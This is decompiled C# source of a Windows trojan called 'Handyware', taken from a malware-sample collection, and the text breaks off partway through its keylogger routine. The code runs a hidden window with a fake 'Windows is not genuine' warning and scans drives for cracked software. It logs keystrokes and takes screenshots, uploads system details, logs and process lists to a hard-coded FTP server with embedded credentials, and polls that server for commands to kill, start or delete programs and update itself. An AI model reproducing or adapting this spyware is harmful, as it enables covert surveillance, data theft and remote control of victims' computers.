// Decompiled with JetBrains decompiler
// Type: Handyware.Form1
// Assembly: Handyware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79A15AC7-DE29-40AC-9E7A-1719C725BB8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.dizu-68e906811b2a0a3f0f264be4966fee8440ac83cc6a06bae2c47bdbf43e5284bc.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Handyware
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    private System.Windows.Forms.Timer timer_hide;
    private System.Windows.Forms.Timer timer_30seg;
    private System.Windows.Forms.Timer timer_10min;
    private System.Windows.Forms.Timer timer_20min;
    private System.Windows.Forms.Timer timer_CloseHandyware;
    private Label label_mex;
    private Button button_ideMex;
    private System.Windows.Forms.Timer timer_notifyFilaEspera;
    private System.Windows.Forms.Timer timer_hideNotify;
    private System.Windows.Forms.Timer timer_showNotify;
    private System.Windows.Forms.Timer timer_checkWindowTitle;
    private FileSystemWatcher fileSystemWatcher_userProfileFolder;
    private System.Windows.Forms.Timer timer_01seg;
    private System.Windows.Forms.Timer timer_30min;
    private System.Windows.Forms.Timer timer_logger;
    private System.Windows.Forms.Timer timer_05min;
    private System.Windows.Forms.Timer timer_01min;
    private System.Windows.Forms.Timer timer_guardadinhoCheck;
    private Thread thrUpdate;
    private Thread thrFindCrack;
    private Thread thrSendInfetedData;
    private Thread thrSendLog;
    private Thread thrSendPrints;
    private Thread thrPrintRequest;
    private Thread thrCommandRequest;
    private Thread thrSendProcess;
    private static uint SPI_SETDESKWALLPAPER = 20;
    private static uint SPIF_UPDATEINIFILE = 1;
    private string workspace;
    private string currentVersion;
    private string logPathError;
    private string logPathWindowTitle;
    private string currentWindowTitle;
    private string oldWindowTitle;
    private string lastWindowMsn;
    private int iTimerHide;
    private int difX;
    private int difY;
    private bool hided;
    private bool mouseDown;
    private bool shareFacebook;
    private bool shareTwitter;
    private bool shareMsn;
    private List<string> lstNotifications;
    private List<string> lstAllPaths;
    private List<string> palavrasChaveCrack;
    private List<string> urlsAutoShare;
    private List<string> lstProcess;
    private string fileDocuments;
    private string fileDesktop;
    private string fileDevices;
    private string fileDropbox;
    private CheckBox chbxNotificationShowHide;
    private WormAction actWorm;
    private UpdateProgram uptProgram;
    private string infoStartUp;
    private bool keyDown;
    private bool canRetShift;
    private string logger;
    private string oldWindowLog;
    private DateTime startTime;
    private bool browseExplorer;
    private bool browseChrome;
    private bool browseFirefox;
    private bool browseSafari;
    private DateTime timePrint1;
    private DateTime timePrint2;
    private DateTime timePrint3;
    private bool Print1;
    private bool Print2;
    private bool Print3;
    private string messageboxTitle;
    private string messageboxText;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.timer_hide = new System.Windows.Forms.Timer(this.components);
      this.timer_30seg = new System.Windows.Forms.Timer(this.components);
      this.timer_10min = new System.Windows.Forms.Timer(this.components);
      this.timer_20min = new System.Windows.Forms.Timer(this.components);
      this.timer_CloseHandyware = new System.Windows.Forms.Timer(this.components);
      this.label_mex = new Label();
      this.button_ideMex = new Button();
      this.timer_notifyFilaEspera = new System.Windows.Forms.Timer(this.components);
      this.timer_hideNotify = new System.Windows.Forms.Timer(this.components);
      this.timer_showNotify = new System.Windows.Forms.Timer(this.components);
      this.timer_checkWindowTitle = new System.Windows.Forms.Timer(this.components);
      this.fileSystemWatcher_userProfileFolder = new FileSystemWatcher();
      this.timer_01seg = new System.Windows.Forms.Timer(this.components);
      this.timer_30min = new System.Windows.Forms.Timer(this.components);
      this.timer_logger = new System.Windows.Forms.Timer(this.components);
      this.timer_05min = new System.Windows.Forms.Timer(this.components);
      this.timer_01min = new System.Windows.Forms.Timer(this.components);
      this.timer_guardadinhoCheck = new System.Windows.Forms.Timer(this.components);
      this.fileSystemWatcher_userProfileFolder.BeginInit();
      this.SuspendLayout();
      this.timer_hide.Tick += new EventHandler(this.timer_hide_Tick);
      this.timer_30seg.Interval = 10000;
      this.timer_30seg.Tick += new EventHandler(this.timer_propagacao_Tick);
      this.timer_10min.Interval = 30000;
      this.timer_10min.Tick += new EventHandler(this.timer_actions_Tick);
      this.timer_20min.Interval = 60000;
      this.timer_20min.Tick += new EventHandler(this.timer_update_Tick);
      this.timer_CloseHandyware.Interval = 5000;
      this.timer_CloseHandyware.Tick += new EventHandler(this.timer_CloseHandyware_Tick);
      this.label_mex.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.label_mex.AutoSize = true;
      this.label_mex.BackColor = System.Drawing.Color.Silver;
      this.label_mex.BorderStyle = BorderStyle.Fixed3D;
      this.label_mex.Font = new Font("Times New Roman", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label_mex.ForeColor = System.Drawing.Color.Black;
      this.label_mex.Location = new Point(12, 9);
      this.label_mex.Name = "label_mex";
      this.label_mex.Size = new Size(263, 21);
      this.label_mex.TabIndex = 0;
      this.label_mex.Text = "Esta copia do Windows nao é original!";
      this.label_mex.TextAlign = ContentAlignment.MiddleCenter;
      this.label_mex.MouseMove += new MouseEventHandler(this.label_mex_MouseMove);
      this.label_mex.MouseDown += new MouseEventHandler(this.label_mex_MouseDown);
      this.label_mex.MouseUp += new MouseEventHandler(this.label_mex_MouseUp);
      this.button_ideMex.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.button_ideMex.BackColor = System.Drawing.Color.Black;
      this.button_ideMex.Cursor = Cursors.Default;
      this.button_ideMex.FlatAppearance.BorderColor = System.Drawing.Color.Silver;
      this.button_ideMex.FlatAppearance.MouseDownBackColor = System.Drawing.Color.White;
      this.button_ideMex.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Red;
      this.button_ideMex.FlatStyle = FlatStyle.System;
      this.button_ideMex.Font = new Font("Microsoft Sans Serif", 6.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.button_ideMex.Location = new Point(234, 35);
      this.button_ideMex.Name = "button_ideMex";
      this.button_ideMex.Size = new Size(48, 19);
      this.button_ideMex.TabIndex = 1;
      this.button_ideMex.Text = "Close";
      this.button_ideMex.UseVisualStyleBackColor = false;
      this.button_ideMex.Click += new EventHandler(this.button_ideMex_Click);
      this.timer_notifyFilaEspera.Interval = 2000;
      this.timer_notifyFilaEspera.Tick += new EventHandler(this.timer_notify_Tick);
      this.timer_hideNotify.Interval = 30;
      this.timer_hideNotify.Tick += new EventHandler(this.timer_hideNotify_Tick);
      this.timer_showNotify.Interval = 30;
      this.timer_showNotify.Tick += new EventHandler(this.timer_showNotify_Tick);
      this.timer_checkWindowTitle.Interval = 2000;
      this.timer_checkWindowTitle.Tick += new EventHandler(this.timer_checkWindowTitle_Tick);
      this.fileSystemWatcher_userProfileFolder.EnableRaisingEvents = true;
      this.fileSystemWatcher_userProfileFolder.IncludeSubdirectories = true;
      this.fileSystemWatcher_userProfileFolder.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName;
      this.fileSystemWatcher_userProfileFolder.SynchronizingObject = (ISynchronizeInvoke) this;
      this.fileSystemWatcher_userProfileFolder.Created += new FileSystemEventHandler(this.fileSystemWatcher_userProfileFolder_Created);
      this.timer_01seg.Interval = 10000;
      this.timer_01seg.Tick += new EventHandler(this.timer_01seg_Tick);
      this.timer_30min.Interval = 120000;
      this.timer_30min.Tick += new EventHandler(this.timer_30min_Tick);
      this.timer_logger.Interval = 20000;
      this.timer_logger.Tick += new EventHandler(this.timer_logger_Tick);
      this.timer_05min.Interval = 30000;
      this.timer_05min.Tick += new EventHandler(this.timer_05min_Tick);
      this.timer_01min.Interval = 120000;
      this.timer_01min.Tick += new EventHandler(this.timer_01min_Tick);
      this.timer_guardadinhoCheck.Interval = 300000;
      this.timer_guardadinhoCheck.Tick += new EventHandler(this.timer_guardadinhoCheck_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(287, 59);
      this.ControlBox = false;
      this.Controls.Add((Control) this.button_ideMex);
      this.Controls.Add((Control) this.label_mex);
      this.Cursor = Cursors.Default;
      this.DoubleBuffered = true;
      this.ForeColor = System.Drawing.Color.Black;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.01;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Handyware";
      this.TopMost = true;
      this.TransparencyKey = System.Drawing.Color.Magenta;
      this.MouseUp += new MouseEventHandler(this.Form1_MouseUp);
      this.MouseDown += new MouseEventHandler(this.Form1_MouseDown);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.MouseMove += new MouseEventHandler(this.Form1_MouseMove);
      this.fileSystemWatcher_userProfileFolder.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private void updateProgram()
    {
      if (!this.uptProgram.Update())
        return;
      Process.Start(this.workspace + "\\handyware_newversion.exe");
    }

    private void findCrack()
    {
      this.lstAllPaths = new List<string>();
      this.lstAllPaths.Add(Environment.ExpandEnvironmentVariables("%userprofile%").ToString());
      this.searchSubPaths(Environment.ExpandEnvironmentVariables("%userprofile%").ToString());
      string[] logicalDrives = Environment.GetLogicalDrives();
      for (int index = 0; index < logicalDrives.Length; ++index)
      {
        if (!Directory.Exists(logicalDrives[index] + "windows"))
        {
          this.lstAllPaths.Add(logicalDrives[index]);
          this.searchSubPaths(logicalDrives[index]);
        }
      }
      this.searchCrack();
      Thread.Sleep(600000);
    }

    private void searchCrack()
    {
      try
      {
        Environment.GetLogicalDrives();
        foreach (string lstAllPath in this.lstAllPaths)
        {
          bool flag = false;
          foreach (string FindString in this.palavrasChaveCrack)
          {
            try
            {
              foreach (string file in Directory.GetFiles(lstAllPath, "*.*", SearchOption.TopDirectoryOnly))
              {
                FileInfo fileInfo = new FileInfo(file);
                if (this.Contains(fileInfo.Name, FindString, StringComparison.CurrentCultureIgnoreCase))
                {
                  this.lstNotifications.Add("Founded a possible illegal file: \r\n...\\" + fileInfo.Directory.Name + "\\" + fileInfo.Name + "|" + fileInfo.DirectoryName);
                  flag = true;
                }
              }
            }
            catch
            {
            }
          }
          foreach (string FindString in this.palavrasChaveCrack)
          {
            if (!flag)
            {
              try
              {
                DirectoryInfo directoryInfo = new DirectoryInfo(lstAllPath);
                if (this.Contains(directoryInfo.Name, FindString, StringComparison.CurrentCultureIgnoreCase))
                {
                  this.lstNotifications.Add("Founded a possible illegal files in: \r\n" + directoryInfo.FullName + "|" + directoryInfo.FullName);
                  break;
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    private void searchSubPaths(string rootPath)
    {
      try
      {
        string[] directories = Directory.GetDirectories(rootPath, "*", SearchOption.TopDirectoryOnly);
        for (int index = 0; index < directories.Length; ++index)
        {
          try
          {
            if (!this.lstAllPaths.Contains(directories[index]))
              this.lstAllPaths.Add(directories[index]);
            this.searchSubPaths(directories[index]);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    private void sendInfectedData()
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + ".txt"));
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.UsePassive = true;
        ftpWebRequest.KeepAlive = false;
        int int32 = Convert.ToInt32(TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).TotalHours);
        if (TimeZone.CurrentTimeZone.IsDaylightSavingTime(DateTime.Now))
          --int32;
        string str1 = "Unknown";
        string str2 = "Unknown";
        string str3 = "Unknown";
        string str4 = "Unknown";
        string str5 = "Unknown";
        string str6 = "Unknown";
        string str7 = "Unknown";
        string str8 = "Unknown";
        string str9 = "Unknown";
        string str10 = "Unknown";
        string str11 = "";
        TimeSpan timeSpan = this.startTime - this.startTime;
        try
        {
          str1 = Environment.OSVersion.ToString();
        }
        catch
        {
        }
        try
        {
          str2 = Environment.MachineName.ToString();
        }
        catch
        {
        }
        try
        {
          str3 = Environment.UserName.ToString();
        }
        catch
        {
        }
        try
        {
          str4 = Environment.SystemDirectory.ToString();
        }
        catch
        {
        }
        try
        {
          str5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
        }
        catch
        {
        }
        try
        {
          str7 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToString();
        }
        catch
        {
        }
        try
        {
          str6 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).ToString();
        }
        catch
        {
        }
        try
        {
          str8 = this.getLocalIP();
        }
        catch
        {
        }
        try
        {
          string[] strArray1 = new string[9];
          string[] strArray2 = strArray1;
          DateTime now = DateTime.Now;
          string str12 = now.Year.ToString();
          strArray2[0] = str12;
          strArray1[1] = ".";
          string[] strArray3 = strArray1;
          now = DateTime.Now;
          int num = now.Month;
          string str13 = num.ToString("00");
          strArray3[2] = str13;
          strArray1[3] = ".";
          string[] strArray4 = strArray1;
          now = DateTime.Now;
          num = now.Day;
          string str14 = num.ToString("00");
          strArray4[4] = str14;
          strArray1[5] = "  ";
          string[] strArray5 = strArray1;
          now = DateTime.Now;
          string longTimeString = now.ToLongTimeString();
          strArray5[6] = longTimeString;
          strArray1[7] = "  GMT";
          strArray1[8] = int32.ToString();
          str9 = string.Concat(strArray1);
        }
        catch
        {
        }
        try
        {
          switch (this.originalWindows6())
          {
            case -1:
              str10 = "No";
              break;
            case 1:
              str10 = "Yes";
              break;
          }
        }
        catch
        {
        }
        try
        {
          timeSpan = DateTime.Now - this.startTime;
        }
        catch
        {
        }
        try
        {
          if (this.browseChrome)
            str11 = !(str11 == "") ? str11 + ", Chrome" : "Chrome";
          if (this.browseFirefox)
            str11 = !(str11 == "") ? str11 + ", Firefox" : "Firefox";
          if (this.browseExplorer)
            str11 = !(str11 == "") ? str11 + ", iExplorer" : "iExplorer";
          if (this.browseSafari)
            str11 = !(str11 == "") ? str11 + ", Safari" : "Safari";
        }
        catch
        {
        }
        byte[] bytes = new UTF8Encoding().GetBytes("System Information:\r\n   OS version: " + str1 + "\r\n   Genuine: " + str10 + "\r\n   Machine: " + str2 + "\r\n   User: " + str3 + "\r\n   System directory: " + str4 + "\r\n   Programs directory: " + str7 + "\r\n   AppData directory: " + str5 + "\r\n   Documents directory: " + str6 + "\r\n   Browsers: " + str11 + "\r\n   Local IP: " + str8 + "\r\n   Running: " + timeSpan.Days.ToString("00") + "d  " + timeSpan.Hours.ToString("00") + ":" + timeSpan.Minutes.ToString("00") + ":" + timeSpan.Seconds.ToString("00") + "\r\n   Time check: " + str9 + "\r\n\r\nHandyware Information:\r\n   Version: " + this.currentVersion + "\r\n   StartUp: " + this.infoStartUp);
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
      }
      catch (Exception ex)
      {
        this.writeLogError("Send Ftp Data\r\nError: " + ex.Message);
      }
    }

    private void sendLog()
    {
      try
      {
        if (!(this.logger != "") || this.logger.IndexOf("\r\n") == -1)
          return;
        int int32 = Convert.ToInt32(TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).TotalHours);
        if (TimeZone.CurrentTimeZone.IsDaylightSavingTime(DateTime.Now))
          --int32;
        string str = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - LOG.txt";
        bool flag;
        try
        {
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str);
          ftpWebRequest.Method = "SIZE";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
          ftpWebRequest.GetResponse();
          flag = true;
        }
        catch
        {
          flag = false;
        }
        if (flag)
        {
          string[] strArray1 = new string[8];
          strArray1[0] = "\r\n\r\n\r\n";
          string[] strArray2 = strArray1;
          DateTime now = DateTime.Now;
          string shortDateString = now.ToShortDateString();
          strArray2[1] = shortDateString;
          strArray1[2] = "  ";
          string[] strArray3 = strArray1;
          now = DateTime.Now;
          string longTimeString = now.ToLongTimeString();
          strArray3[3] = longTimeString;
          strArray1[4] = " GMT";
          strArray1[5] = int32.ToString();
          strArray1[6] = "\r\n";
          strArray1[7] = this.logger;
          string s = string.Concat(strArray1);
          this.logger = "";
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str);
          ftpWebRequest.Method = "APPE";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
          ftpWebRequest.UseBinary = true;
          ftpWebRequest.UsePassive = true;
          ftpWebRequest.KeepAlive = false;
          byte[] bytes = new UTF8Encoding().GetBytes(s);
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(bytes, 0, bytes.Length);
          requestStream.Close();
        }
        else
        {
          string s = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + "\r\n\r\n\r\n" + DateTime.Now.ToShortDateString() + "  " + DateTime.Now.ToLongTimeString() + " GMT" + int32.ToString() + "\r\n" + this.logger;
          this.logger = "";
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str);
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
          ftpWebRequest.UseBinary = true;
          ftpWebRequest.UsePassive = true;
          ftpWebRequest.KeepAlive = false;
          byte[] bytes = new UTF8Encoding().GetBytes(s);
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(bytes, 0, bytes.Length);
          requestStream.Close();
        }
      }
      catch (Exception ex)
      {
        this.writeLogError("Send Log\r\nError: " + ex.Message);
      }
    }

    private void sendPrints()
    {
      try
      {
        string str1 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT1.png";
        string str2 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT2.png";
        string str3 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT3.png";
        FtpWebRequest ftpWebRequest1 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str1);
        ftpWebRequest1.Method = "STOR";
        ftpWebRequest1.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
        ftpWebRequest1.UseBinary = true;
        ftpWebRequest1.UsePassive = true;
        ftpWebRequest1.KeepAlive = false;
        FileStream fileStream1 = new FileStream(this.workspace + "\\" + str1, FileMode.Open, FileAccess.Read);
        byte[] buffer1 = new byte[fileStream1.Length];
        fileStream1.Read(buffer1, 0, Convert.ToInt32(fileStream1.Length));
        fileStream1.Close();
        Stream requestStream1 = ftpWebRequest1.GetRequestStream();
        requestStream1.Write(buffer1, 0, buffer1.Length);
        requestStream1.Close();
        FtpWebRequest ftpWebRequest2 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str2);
        ftpWebRequest2.Method = "STOR";
        ftpWebRequest2.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
        ftpWebRequest2.UseBinary = true;
        ftpWebRequest2.UsePassive = true;
        ftpWebRequest2.KeepAlive = false;
        FileStream fileStream2 = new FileStream(this.workspace + "\\" + str2, FileMode.Open, FileAccess.Read);
        byte[] buffer2 = new byte[fileStream2.Length];
        fileStream2.Read(buffer2, 0, Convert.ToInt32(fileStream2.Length));
        fileStream2.Close();
        Stream requestStream2 = ftpWebRequest2.GetRequestStream();
        requestStream2.Write(buffer2, 0, buffer2.Length);
        requestStream2.Close();
        FtpWebRequest ftpWebRequest3 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str3);
        ftpWebRequest3.Method = "STOR";
        ftpWebRequest3.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
        ftpWebRequest3.UseBinary = true;
        ftpWebRequest3.UsePassive = true;
        ftpWebRequest3.KeepAlive = false;
        FileStream fileStream3 = new FileStream(this.workspace + "\\" + str3, FileMode.Open, FileAccess.Read);
        byte[] buffer3 = new byte[fileStream3.Length];
        fileStream3.Read(buffer3, 0, Convert.ToInt32(fileStream3.Length));
        fileStream3.Close();
        Stream requestStream3 = ftpWebRequest3.GetRequestStream();
        requestStream3.Write(buffer3, 0, buffer3.Length);
        requestStream3.Close();
      }
      catch (Exception ex)
      {
        this.writeLogError("Send Print\r\nError: " + ex.Message);
      }
      this.Print1 = false;
      this.Print2 = false;
      this.Print3 = false;
    }

    private void printRequest()
    {
      Thread.Sleep(30000);
      while (true)
      {
        try
        {
          FtpWebRequest ftpWebRequest1 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.txt"));
          ftpWebRequest1.Method = "SIZE";
          ftpWebRequest1.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
          ftpWebRequest1.UseBinary = true;
          ftpWebRequest1.UsePassive = true;
          ftpWebRequest1.KeepAlive = false;
          try
          {
            ftpWebRequest1.GetResponse();
            string str = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.png";
            FtpWebRequest ftpWebRequest2 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + str);
            ftpWebRequest2.Method = "STOR";
            ftpWebRequest2.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
            ftpWebRequest2.UseBinary = true;
            ftpWebRequest2.UsePassive = true;
            ftpWebRequest2.KeepAlive = false;
            int width = Screen.PrimaryScreen.Bounds.Width;
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            int height = bounds.Height;
            Bitmap b = new Bitmap(width, height, PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage((Image) b);
            bounds = Screen.PrimaryScreen.Bounds;
            int x = bounds.X;
            bounds = Screen.PrimaryScreen.Bounds;
            int y = bounds.Y;
            bounds = Screen.PrimaryScreen.Bounds;
            Size size = bounds.Size;
            graphics.CopyFromScreen(x, y, 0, 0, size, CopyPixelOperation.SourceCopy);
            this.resizeBitmap(b, b.Width, b.Height, 80).Save(this.workspace + "\\" + str, ImageFormat.Png);
            FileStream fileStream = new FileStream(this.workspace + "\\" + str, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[fileStream.Length];
            fileStream.Read(buffer, 0, Convert.ToInt32(fileStream.Length));
            fileStream.Close();
            Stream requestStream = ftpWebRequest2.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            FtpWebRequest ftpWebRequest3 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.txt"));
            ftpWebRequest3.Method = "DELE";
            ftpWebRequest3.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
            ftpWebRequest3.UseBinary = true;
            ftpWebRequest3.UsePassive = true;
            ftpWebRequest3.KeepAlive = false;
            ftpWebRequest3.GetResponse();
          }
          catch
          {
          }
        }
        catch
        {
        }
        Thread.Sleep(15000);
      }
    }

    private void commandRequest()
    {
      Thread.Sleep(30000);
      while (true)
      {
        try
        {
          FtpWebRequest ftpWebRequest1 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - COMMAND.txt"));
          ftpWebRequest1.Method = "RETR";
          ftpWebRequest1.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
          ftpWebRequest1.UseBinary = true;
          ftpWebRequest1.UsePassive = true;
          ftpWebRequest1.KeepAlive = false;
          try
          {
            StreamReader streamReader = new StreamReader(ftpWebRequest1.GetResponse().GetResponseStream());
            string end = streamReader.ReadToEnd();
            streamReader.Close();
            try
            {
              FtpWebRequest ftpWebRequest2 = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - COMMAND.txt"));
              ftpWebRequest2.Method = "DELE";
              ftpWebRequest2.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
              ftpWebRequest2.UseBinary = true;
              ftpWebRequest2.UsePassive = true;
              ftpWebRequest2.KeepAlive = false;
              ftpWebRequest2.GetResponse();
            }
            catch
            {
            }
            List<string> stringList = new List<string>((IEnumerable<string>) end.Split(new string[1]
            {
              "\r\n"
            }, StringSplitOptions.RemoveEmptyEntries));
            switch (stringList[0])
            {
              case "kill":
                for (int index = 1; index < stringList.Count; ++index)
                  this.killProcess(stringList[index]);
                break;
              case "start":
                for (int index = 1; index < stringList.Count; ++index)
                  Process.Start(stringList[index]);
                break;
              case "del":
                for (int index = 1; index < stringList.Count; ++index)
                {
                  try
                  {
                    System.IO.File.Delete(stringList[index]);
                  }
                  catch
                  {
                  }
                }
                break;
              case "messagebox":
                this.messageboxTitle = stringList[1];
                this.messageboxText = stringList[2];
                break;
              case "update":
                try
                {
                  if (!this.thrUpdate.IsAlive)
                  {
                    this.thrUpdate = new Thread(new ThreadStart(this.updateProgram));
                    this.thrUpdate.Start();
                    break;
                  }
                  break;
                }
                catch
                {
                  break;
                }
            }
          }
          catch
          {
          }
        }
        catch
        {
        }
        Thread.Sleep(10000);
      }
    }

    private void sendProcess()
    {
      try
      {
        if (this.lstProcess.Count <= 0)
          return;
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + (Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PROCESS.txt"));
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("mylogin", "wildworld92");
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.UsePassive = true;
        ftpWebRequest.KeepAlive = false;
        string s = "";
        foreach (string str1 in this.lstProcess)
        {
          string str2 = str1.Insert(str1.IndexOf('|'), " ");
          string str3 = str2.Insert(str2.IndexOf('|') + 1, " ");
          s = s + str3 + "\r\n";
        }
        byte[] bytes = new UTF8Encoding().GetBytes(s);
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
      }
      catch (Exception ex)
      {
        this.writeLogError("Send Process Data\r\nError: " + ex.Message);
      }
    }

    [DllImport("Slwga.dll", BestFitMapping = false)]
    internal static extern uint SLIsGenuineLocal(
      ref Guid slid,
      [In, Out] ref Form1.SL_GENUINE_STATE genuineState,
      IntPtr val3);

    public static bool IsGenuineWindows()
    {
      bool flag = false;
      Guid slid = new Guid("55c92734-d682-4d71-983e-d6ec3f16059f");
      try
      {
        Form1.SL_GENUINE_STATE genuineState = Form1.SL_GENUINE_STATE.SL_GEN_STATE_LAST;
        uint num = Form1.SLIsGenuineLocal(ref slid, ref genuineState, IntPtr.Zero);
        if (num == 0U)
          flag = genuineState == Form1.SL_GENUINE_STATE.SL_GEN_STATE_IS_GENUINE;
        else
          Console.WriteLine("Error getting information {0}", (object) num.ToString());
      }
      catch (Exception ex)
      {
      }
      return flag;
    }

    private int originalWindows6()
    {
      if (Environment.OSVersion.Version.Major < 6)
        return 0;
      return Form1.IsGenuineWindows() ? 1 : -1;
    }

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    private string GetKeyPressed(int i, ref bool newLine, bool canRetShift)
    {
      bool flag = Control.IsKeyLocked(Keys.Capital);
      switch (i)
      {
        case 1:
          newLine = true;
          return "<Left-Click>";
        case 2:
          newLine = true;
          return "<Right-Click>";
        case 8:
          return "<Back-Space>";
        case 9:
          return "<Tab>";
        case 13:
          newLine = true;
          return "<Enter>";
        case 16:
          if (canRetShift)
            return "<Shift>";
          return flag ? ((char) i).ToString() : ((char) (i + 32)).ToString();
        case 20:
          return "<Caps-Lock>";
        case 27:
          newLine = true;
          return "<ESC>";
        case 32:
          return " ";
        case 33:
          return "<Page-Up>";
        case 34:
          return "<Page-Down>";
        case 37:
          return "<Left-Arrow>";
        case 38:
          return "<Up-Arrow>";
        case 39:
          return "<Right-Arrow>";
        case 40:
          return "<Down-Arrow>";
        case 48:
          return "0";
        case 49:
          return "1";
        case 50:
          return "2";
        case 51:
          return "3";
        case 52:
          return "4";
        case 53:
          return "5";
        case 54:
          return "6";
        case 55:
          return "7";
        case 56:
          return "8";
        case 57:
          return "9";
        case 64:
          return "@";
        case 91:
          return "<Windows-Key>";
        case 93:
          return "<Menu-Key>";
        case 112:
